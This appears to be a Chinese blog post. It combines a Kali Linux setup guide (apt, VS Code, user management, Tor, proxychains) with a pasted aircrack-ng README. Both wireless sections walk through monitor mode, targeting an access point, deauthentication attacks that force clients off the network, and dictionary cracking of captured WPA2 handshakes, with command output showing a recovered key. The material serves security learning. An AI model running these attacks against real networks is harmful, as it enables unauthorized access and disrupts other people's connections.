---
title: Kali
description: 
date: 2025-11-19
categories:
    - 
    - 
---

更新与升级

sudo apt upgrade -y

sudo apt autoremove



# Kali Linux 深度工程指南：从内核配置到无线审计

Version: 2.0 (Architect Edition)

Audience: Red Team / System Engineers

Environment: Local Isolated Sandbox

------

## 一、包管理与系统核心维护 (Package Management & Kernel)

**首席批注：** 原文档中直接运行 `apt upgrade` 是错误的。APT (Advanced Package Tool) 依赖本地数据库索引。如果不先 `update`，你安装的只是旧索引中的版本。

### 1. 标准化更新流程

在执行任何操作前，必须确保本地依赖树与远程仓库一致。

Bash

```
# 1. 更新包索引 (Syncing metadata)
# 原理：从 /etc/apt/sources.list 读取源，下载 Package.gz 并解析到 /var/lib/apt/lists/
sudo apt update

# 2. 智能升级 (Smart Upgrade)
# 区别：upgrade 比较保守；full-upgrade (dist-upgrade) 会处理依赖关系的改变（如内核版本更迭）
sudo apt full-upgrade -y

# 3. 清理孤儿包 (Dependency GC)
# 原理：删除那些被标记为 "auto" 安装且不再被任何 "manual" 包依赖的库
sudo apt autoremove -y

# 4. 清理缓存 (释放磁盘 IO 和空间)
sudo apt clean
```

### 2. 故障排查：APT 锁死

如果你看到 `Could not get lock /var/lib/dpkg/lock`，这意味着 `dpkg` 进程（APT 的底层后端）被占用。

- **粗暴解法（不推荐）：** 直接删锁文件。

- **架构师解法：** 找出进程并优雅终止。

  Bash

  ```
  ps aux | grep -i apt
  sudo kill -9 <PID>
  sudo dpkg --configure -a  # 修复中断的安装事务
  ```

------

## 二、开发环境构建：VS Code (The Debian Way)

**首席批注：** 原文档手动下载 `.deb` 包并移动到 `/tmp` 是典型的“Windows 思维”。Linux 的核心优势是**仓库化管理**。手动安装无法自动更新，存在安全隐患。

### 1. 添加微软官方源 (GPG Signed Repository)

这确保了软件的完整性（Integrity）和自动更新能力。

Bash

```
# 1. 安装传输依赖
sudo apt install wget gpg

# 2. 导入微软 GPG 公钥 (Web of Trust)
# 这一步至关重要，防止中间人攻击篡改软件包
wget -qO- https://packages.microsoft.com/keys/microsoft.asc | gpg --dearmor > packages.microsoft.gpg
sudo install -D -o root -g root -m 644 packages.microsoft.gpg /etc/apt/keyrings/packages.microsoft.gpg

# 3. 添加软件源列表
sudo sh -c 'echo "deb [arch=amd64,arm64,armhf signed-by=/etc/apt/keyrings/packages.microsoft.gpg] https://packages.microsoft.com/repos/code stable main" > /etc/apt/sources.list.d/vscode.list'

# 4. 刷新并安装
sudo apt update
sudo apt install code -y
```

### 2. 权限警告 (Sandboxing Issue)

- **绝对禁止**使用 `root` 运行 VS Code (`sudo code .`)。
- **原理：** VS Code 基于 Electron (Chromium)。Chromium 的沙箱机制（Sandbox）在 root 下无法正常工作，且任何插件漏洞都会直接暴露系统最高权限。
- **正确做法：** 以普通用户运行，需要系统权限时，VS Code 会通过 `polkit` 弹窗请求密码。

------

## 三、用户权限与身份管理 (IAM)

**首席批注：** `sudo su` 是懒惰且危险的习惯。它会污染环境变量（Environment Variables）。

### 1. 正确创建用户 (User Provisioning)

Bash

```
# 1. 切换到 root 环境 (加载 root 的完整环境变量)
sudo -i

# 2. 添加用户 (adduser 是 useradd 的 Perl 脚本封装，更友好)
adduser justwin

# 3. 授予 Sudo 权限 (修改组而不是修改文件)
# 原理：将用户加入 wheel 或 sudo 组，这些组在 /etc/sudoers 中已被定义
usermod -aG sudo justwin

# 4. 验证 (Always Verify)
id justwin
# 输出应包含: groups=1000(justwin),27(sudo)...
```

### 2. Sudoers 配置原理

如果需要更细粒度的控制（例如：允许运行 Nmap 但不允许运行 rm），不要直接编辑 `/etc/sudoers`，必须使用 `visudo`。

- **原理：** `visudo` 会在保存前进行语法检查。如果直接用 vim 编辑并保存了错误语法，你会把自己锁在系统之外（Lockout）。

------

## 四、匿名网络：Tor Browser (OpSec 核心)

**首席批注：** 原文档最大的漏洞在于**未校验签名**。在一个黑客系统中下载二进制文件而不校验签名，无异于裸奔。

### 1. 验证信任链 (Chain of Trust)

Bash

```
# 1. 下载安装包和签名文件 (.asc)
wget https://www.torproject.org/dist/torbrowser/13.0.x/tor-browser-linux64-13.0.x_ALL.tar.xz
wget https://www.torproject.org/dist/torbrowser/13.0.x/tor-browser-linux64-13.0.x_ALL.tar.xz.asc

# 2. 导入 Tor 开发者公钥
gpg --auto-key-locate nodefault,wkd --locate-keys torbrowser@torproject.org

# 3. 验证指纹 (Critical Step)
gpg --verify tor-browser-linux64-*.tar.xz.asc
# 必须看到 "Good signature" 才能继续解压！
```

### 2. 网络层原理

- 运行 Tor 浏览器后，它会在本地开启 SOCKS5 代理（通常是 127.0.0.1:9050）。
- 如果你想让终端命令也走 Tor，使用 `proxychains`：
  - 编辑 `/etc/proxychains4.conf` 确保指向 9050。
  - 命令：`proxychains4 nmap -sT -Pn target.com` (注意：Nmap 默认发 ICMP，代理无法转发 ICMP，必须加 -Pn 和 -sT)。

------

## 五、无线渗透与 RF 协议分析 (Wireless Auditing)

**首席批注：** 原文档的命令已经过时（Deprecated）。现代 Linux 内核使用 `nl80211` 驱动框架，应尽量使用 `ip` 和 `iw` 命令替代 `ifconfig` 和 `iwconfig`。

### 1. 物理层准备 (Hardware Layer)

Check Kill 的必要性：

当你试图将网卡切入 Monitor 模式时，系统的 NetworkManager 和 wpa_supplicant 会不断尝试接管网卡并将其重置为 Managed 模式。必须杀死这些进程。

Bash

```
# 1. 检查并杀死干扰进程
sudo airmon-ng check kill

# 2. 开启监听模式 (Monitor Mode)
# 这会让网卡接收空气中所有的 802.11 帧，不仅仅是发往本机 MAC 的。
sudo airmon-ng start wlan0
# 注意：网卡名可能会变为 wlan0mon
```

### 2. 侦察与目标锁定 (Reconnaissance)

```
# 扫描频谱
# Airodump 直接读取内核 Ring Buffer 中的 802.11 帧
sudo airodump-ng wlan0mon
```

**关键数据解读：**

- **BSSID:** AP 的 MAC 地址。
- **PWR:** 信号强度（dBm，负值，越接近 0 越好）。
- **CH:** 信道（Channel）。**攻击时必须锁定信道**，否则网卡会在信道间跳跃（Channel Hopping），导致丢包。

### 3. 精确打击与握手包捕获 (The 4-Way Handshake)

**技术原理：** WPA2/3 安全的核心在于 EAPOL 四次握手。我们不需要破解整个流量，只需要捕获这个握手过程，就能拿到用于生成加密密钥的随机数（Nonce）和 MIC（完整性校验值）。

Bash

```
# 1. 开启针对性监听 (写入文件 output)
# -c: 锁定信道 (减少跳频干扰)
# --bssid: 锁定目标 AP
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w /home/kali/captures/target wlan0mon

# 2. 主动攻击：解除认证攻击 (De-authentication Attack)
# 原理：发送伪造的 802.11 管理帧（Management Frame），欺骗客户端断开连接。客户端自动重连时会触发四次握手。
# 新开一个终端窗口：
sudo aireplay-ng -0 5 -a <AP_MAC> -c <CLIENT_MAC> wlan0mon
```

### 4. 密码学破解 (Offline Cracking)

获得 `.cap` 文件后，本质上是在进行哈希碰撞。

Bash

```
# 字典攻击
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <AP_MAC> target-01.cap
```

------

## 六、文件同步方案 (Best Practice)

**首席批注：** Unison 很好，但对于工程师来说，`rsync` 是标准，`SSHFS` 是便捷。

### 推荐方案：SSHFS (远程挂载)

将虚拟机或远程主机的文件系统直接挂载到本地，像操作本地磁盘一样操作。

Bash

```
# 1. 安装
sudo apt install sshfs

# 2. 挂载
mkdir ~/win_share
sshfs user@192.168.1.5:/d/projects ~/win_share

# 3. 卸载
fusermount -u ~/win_share
```

------

## 七、终端多路复用 (Terminal Multiplexer)

**首席建议：** Terminator 是不错的图形化工具，但作为一个高阶用户，我建议你学习 **Tmux**。

- **理由：** Tmux 运行在服务端。即便 SSH 断开，会话依然保留（Persistence）。
- **Terminator 配置重点：** 务必配置快捷键。
  - `Ctrl+Shift+O`: 水平分屏
  - `Ctrl+Shift+E`: 垂直分屏
  - **Broadcast all:** 将输入广播到所有终端（用于批量管理服务器）。

------

### 总结

这份修正后的文档不仅纠正了操作错误，更重要的是建立了**安全意识**（如签名校验、权限管理）和**工程化思维**（如包管理机制、协议原理）。在我的沙箱实验室中，这是作为一名合格工程师的最低标准。

现在，去执行你的任务吧。





# wpa-dictionary

Used for Wi-Fi password cracking | 用于 Wi-Fi 密码破解。

### Linux 篇（Recommended | 推荐）

The Kali distribution already has everything installed | Kali 发行版已经安装了所有东西

Full english instructions at: https://aircrack-ng.org/doku.php?id=getting_started

### 1. Install | 安装 aircrack-ng

* On Debian/Ubuntu using apt to install: | 使用相应包管理工具安装，例如 Debian/Ubuntu 使用 apt 安装：

~~~shell
sudo apt install aircrack-ng
~~~

### 2. View available wireless network cards | 查看可用的无线网卡

Use the command | 使用命令：`airmon-ng`

~~~
netcon@conwlt:~/workspace$ sudo airmon-ng

PHY	Interface	Driver		Chipset

phy0	wlp8s0		iwlwifi		Intel Corporation Centrino Wireless-N 2230 (rev c4)
~~~
 
The available wifi card is `wlp8s0` | 根据以上输出，可用的无线网卡为 `wlp8s0`。

### 3. Specify the wireless network card to turn on the monitor mode | 指定无线网卡开启监听模式。

使用命令：`airmon-ng start <网卡名称>`

Use the command `airmon-ng start wlp8s0`

~~~
netcon@conwlt:~/workspace$ sudo airmon-ng start wlp8s0

PHY	Interface	Driver		Chipset

phy0	wlp8s0		iwlwifi		Intel Corporation Centrino Wireless-N 2230 (rev c4)

		(mac80211 monitor mode vif enabled for [phy0]wlp8s0 on [phy0]wlp8s0mon)
		(mac80211 station mode vif disabled for [phy0]wlp8s0)
~~~

Now wlp8s0 is available for monitoring as `wlp8s0mon` | 根据以上输出，已经把 wlp8s0 这块无线网卡开启监听模式，开启后名字是 `wlp8s0mon`。

开启监听模式后无线网卡无法继续连接 wifi，使用后需要关闭监听模式。

With the monitor mode active the card can not be used to connect to any wifi, you have to stop it later to use as a normal card

### 4. Scan for nearby wireless networks | 扫描附近的无线网络

使用命令：`airodump-ng <处于监听模式的网卡名称>`

Use the command `airodump-ng wlp8s0mon`

~~~
netcon@conwlt:~/workspace$ sudo airodump-ng wlp8s0mon

 CH  5 ][ Elapsed: 12 s ][ 2018-10-07 18:49              

 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 22:47:DA:62:2A:F0  -50       51       12    0   6  54e. WPA2 CCMP   PSK  AndroidAP    

 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                  

 22:47:DA:62:2A:F0  AC:BC:32:96:31:8D  -31    0 -24e     0       16   
~~~

这一步会输出两个列表，两个列表不停在刷新。

第一个列表表示扫描到的无线网络 AP 信息，会用到以下几列信息：

* BSSID: 无线 AP 的硬件地址
* PWR: 信号强度，值是负数，绝对值越小表示信号越强
* CH: 无线网络信道
* ENC: 加密方式，我们要破解的是 WPA2
* ESSID: 无线网络的名称

第二个列表表示某个无线网络中和用户设备的连接信息：

* BSSID: 无线 AP 的硬件地址
* STATION: 用户设备的硬件地址

扫描列表会不停刷新，确定最终目标后按 Ctrl-C 退出。

这里仅仅是演示，所以列表只保留了一条结果。

### 5. 使用参数过滤扫描列表，确定扫描目标

使用命令：`airodump-ng -w <扫描结果保存的文件名> -c <无线网络信道> --bssid <目标无线 AP 的硬件地址> <处于监听模式的网卡名称>`

~~~
netcon@conwlt:~/workspace$ sudo airodump-ng -w android -c 6 --bssid 22:47:DA:62:2A:F0 wlp8s0mon


 CH  5 ][ Elapsed: 12 s ][ 2018-10-07 18:49 ][ WPA handshake: 22:47:DA:62:2A:F0

 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 22:47:DA:62:2A:F0  -33 100     1597      387   11   6  54e. WPA2 CCMP   PSK  AndroidAP

 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                  

 22:47:DA:62:2A:F0  AC:BC:32:96:31:8D  -32    1e-24e  1691     2657

~~~

刚扫描时看到输出的扫描状态是这样的：`CH  5 ][ Elapsed: 12 s ][ 2018-10-07 18:49`。

只有当扫描状态后面出现 ` ][ WPA handshake: 22:47:DA:62:2A:F0` 后，我们才拿到拿到进行破解的握手包。

扫描过程中如果有用户设备尝试连接 Wi-Fi 时，我们就会拿到握手包。

所以我们可以同时使用 `aireplay-ng` 对目标设备进行攻击，使其掉线重新连接，这样我们就拿到了握手包。

拿到握手包后按 Ctrl-C 结束扫描即可。

### 6. 使用 aireplay-ng 对目标设备发起攻击

使用命令：`aireplay-ng -<攻击模式> <攻击次数> -a 无线 AP 硬件地址> -c <用户设备硬件地址> <处于监听模式的网卡名称>`

~~~
netcon@conwlt:~$ sudo aireplay-ng -0 0 -a 22:47:DA:62:2A:F0 -c AC:BC:32:96:31:8D wlp8s0mon
18:57:31  Waiting for beacon frame (BSSID: 22:47:DA:62:2A:F0) on channel 6
18:57:32  Sending 64 directed DeAuth. STMAC: [AC:BC:32:96:31:8D] [41|64 ACKs]
18:57:33  Sending 64 directed DeAuth. STMAC: [AC:BC:32:96:31:8D] [19|121 ACKs]
18:57:33  Sending 64 directed DeAuth. STMAC: [AC:BC:32:96:31:8D] [11|80 ACKs]
...
~~~

发起攻击后，当 `airodump-ng` 成功拿到了握手包，使用 Ctrl-C 退出攻击。

### 7. 使用 aircrack-ng 暴力破解 Wi-Fi 密码

使用命令：`aircrack-ng -w 密码字典 <包含握手包的 cap 文件>`

~~~
netcon@conwlt:~/workspace$ aircrack-ng -w wpa-dictionary/common.txt android-01.cap 
Opening android-01.cap
Read 675 packets.

   #  BSSID              ESSID                     Encryption

   1  22:47:DA:62:2A:F0  AndroidAP                 WPA (1 handshake)

Choosing first network as target.

Opening android-01.cap
Reading packets, please wait...

                                 Aircrack-ng 1.2 rc4

      [00:00:00] 12/2492 keys tested (828.33 k/s) 

      Time left: 2 seconds                                       0.48%

                          KEY FOUND! [ 1234567890 ]


      Master Key     : A8 70 17 C2 C4 94 12 99 98 4B BB BE 41 23 5C 0D 
                       4A 3D 62 55 85 64 B2 10 11 79 6C 41 1A A2 3B D3 

      Transient Key  : 58 9D 0D 25 26 81 A9 8E A8 24 AB 1F 40 1A D9 ED 
                       EE 10 17 75 F9 F1 01 EE E3 22 A5 09 54 A8 1D E7 
                       28 76 8A 6C 9E FC D3 59 22 B7 82 4E C8 19 62 D9 
                       F3 12 A0 1D E9 A4 7C 4B 85 AF 26 C5 BA 22 42 9A 

      EAPOL HMAC     : 22 C1 BD A7 BB F4 12 A5 92 F6 30 5C F5 D4 EE BE 
~~~

根据以上输出，我们已经破解成功！Wi-Fi 密码是：`1234567890`

### 8. 无线网卡退出监听模式

使用命令：`airmon-ng stop <处于监听模式的无限网卡名称>`

~~~
netcon@conwlt:~/workspace$ sudo airmon-ng stop wlp8s0mon

PHY	Interface	Driver		Chipset

phy0	wlp8s0mon	iwlwifi		Intel Corporation Centrino Wireless-N 2230 (rev c4)

		(mac80211 station mode vif enabled on [phy0]wlp8s0)

		(mac80211 monitor mode vif disabled for [phy0]wlp8s0mon)

~~~

## MAC OS 篇

### 1. 查看网卡名称

在终端中执行 `ifconfig` 即可查看，通常是 en0

### 2. 使用 airport 监听无线网络

由于某些原因，airmon-ng 无法在 MAC OS 使用，所以只能使用 airport 进行扫描和抓包了，但是并不好用，所以还是使用 linux 吧尽量...

开始扫描，终端中执行：

~~~shell
/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport en0 scan
~~~

扫描结果会是这样的：

| SSID | BSSID | RSSI | CHANNEL | HT | CC | SECURITY (auth/unicast/group) |
| - | - | - | - | - | - | - |
| 小米手机 | 22:47:da:62:2a:f0 | -29 | 6 | Y | -- | WPA2(PSK/AES/AES) |

* SSID 表示 Wi-Fi 名称
* BSSID 表示 Wi-Fi 设备的硬件地址
* RSSI 表示信号强度，值是负数，绝对值越小信号越强
* CHANNEL 表示 Wi-Fi 信道
* HT 表示吞吐量模式，一般都为 Y
* CC 表示国家，中国为 CN
* SECURITY 表示加密方式

### 3. 使用 airport 进行抓包

~~~shell
sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport en0 sniff
~~~

抓一段儿事件之后，使用 Ctrl + C 停止抓包，完成后会生成一个 cap 包，看到如下提示：

~~~
Session saved to /tmp/airportSniff0RjCAO.cap.
~~~

### 4. 安装 [aircrack-ng](https://aircrack-ng.org/)

* 使用 [Homebrew](https://brew.sh/) 安装：

~~~shell
brew install aircrack-ng
~~~

### 5. 使用 aircrack-ng 执行破解

~~~shell
aircrack-ng -w common.txt /tmp/airportSniff0RjCAO.cap
~~~

### Windows

* [下载 Aircrack-ng](https://aircrack-ng.org/downloads.html) 提供了 Windows 的二进制包

* 使用 [WSL](https://docs.microsoft.com/en-us/windows/wsl/about)

### 更多安装方式参考：[安装 Aircrack-ng](https://aircrack-ng.org/install.html)





